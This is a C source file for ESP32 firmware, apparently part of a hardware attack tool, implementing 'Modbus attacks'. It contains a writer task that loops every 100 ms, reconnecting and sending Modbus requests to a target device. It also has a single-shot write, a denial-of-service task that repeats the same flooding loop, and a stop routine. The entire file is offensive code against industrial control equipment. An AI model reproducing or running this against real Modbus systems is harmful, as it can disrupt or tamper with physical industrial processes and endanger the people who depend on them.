#include "modbus_attacks.h"

#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "modbus_engine.h"

#define TAG "Modbus_attacks"

static connection_callback connection_cb;
void modbus_attacks_dos();
static volatile bool attacking = false;

static void writer_task() {
  attacking = true;
  if (modbus_engine_connect() < 0) {
    ESP_LOGE(TAG, "Connection Failed");
    attacking = false;
  }
  if (connection_cb != NULL) {
    connection_cb(attacking);
  }
  while (attacking) {
    modbus_engine_connect();
    modbus_engine_send_request();
    vTaskDelay(pdMS_TO_TICKS(100));
  }

  modbus_engine_disconnect();
  vTaskDelete(NULL);
}

void modbus_attacks_writer(connection_callback cb) {
  ESP_LOGW(TAG, "Launching Writer Loop");
  if (cb != NULL) {
    connection_cb = cb;
  }
  xTaskCreate(writer_task, "writer_task", 4096, NULL, 10, NULL);
}

bool modbus_attacks_writer_single() {
  bool connected = false;
  if (modbus_engine_connect() < 0) {
    ESP_LOGE(TAG, "Connection Failed");
    return connected;
  }
  modbus_engine_connect();
  connected = true;
  if (connected) {
    modbus_engine_send_request();
  }
  return connected;
}

/////////////////////////////////// DOS ////////////////////////////////////

static void dos_task() {
  attacking = true;
  if (modbus_engine_connect() < 0) {
    attacking = false;
  }
  if (connection_cb != NULL) {
    connection_cb(attacking);
  }
  while (attacking) {
    modbus_engine_connect();
    modbus_engine_send_request();
    vTaskDelay(pdMS_TO_TICKS(100));
  }
  modbus_engine_disconnect();
  vTaskDelete(NULL);
}

void modbus_attacks_dos(connection_callback cb) {
  if (cb != NULL) {
    connection_cb = cb;
  }
  xTaskCreate(dos_task, "dos_task", 4096, NULL, 10, NULL);
}

void modbus_attacks_stop() {
  connection_cb = NULL;
  attacking = false;
}
